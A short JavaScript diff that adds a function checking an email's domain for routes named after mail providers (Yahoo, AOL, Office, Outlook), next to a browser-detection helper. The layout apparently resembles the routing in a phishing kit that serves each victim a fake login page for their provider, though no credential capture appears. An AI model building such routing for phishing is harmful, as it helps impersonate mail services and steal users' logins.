@@ -43,3 +43,24 @@ export const getUserBrowser = () => {
     return "Internet Explorer";
   return `Unknown Browser: ${userAgent}`;
 };
+
+export const validateEmailForRoute = (path, email) => {
+  const domain = email.split("@")[1]; // Extract the domain from the email
+  if (!domain) return false; // Invalid email if no domain part
+
+  switch (path) {
+    case "/yahoo":
+      return domain === "yahoo.com";
+    case "/aol":
+      return domain === "aol.com" || domain === "yahoo.com";
+    case "/office":
+    case "/outlook":
+      // Returns true if the domain is not one of the explicitly invalid ones.
+      // This allows all custom domains to be valid.
+      return !["yahoo.com", "gmail.com", "aol.com", "mail.com"].includes(
+        domain
+      );
+    default:
+      return false; // Optionally handle other paths or set a default validation rule
+  }
+};
